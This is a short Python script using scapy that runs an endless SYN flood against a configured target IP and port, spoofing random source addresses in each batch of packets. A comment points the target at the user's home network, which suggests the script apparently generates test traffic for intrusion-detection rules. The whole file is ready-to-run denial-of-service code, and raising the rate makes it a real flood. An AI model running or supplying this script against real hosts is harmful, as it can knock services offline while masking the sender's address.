```python
from scapy.all import *
import random
import time
import sys

# Configuration
target_ip = "192.168.100.50"  # Replace with an IP in your $HOME_NET
target_port = 80
interval = 10
packet_count = 50

# Generate a random IP within a given range
def generate_random_ip():
    return "192.168.1." + str(random.randint(1, 254))

# Generate SYN flood attack
def syn_flood(target_ip, target_port, interval, packet_count):
    try:
        while True:
            print(f"Sending {packet_count} SYN packets to {target_ip}:{target_port} every {interval} seconds from random IPs.")
            sys.stdout.flush()

            for _ in range(packet_count):
                src_ip = generate_random_ip()
                src_port = random.randint(1024, 65535)
                ip = IP(src=src_ip, dst=target_ip)
                syn = TCP(sport=src_port, dport=target_port, flags="S")
                send(ip/syn, verbose=0)
            
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\nKeyboard interrupt detected. Stopping SYN flood.")
        sys.exit(0)

# Run the SYN flood attack
syn_flood(target_ip, target_port, interval, packet_count)
```
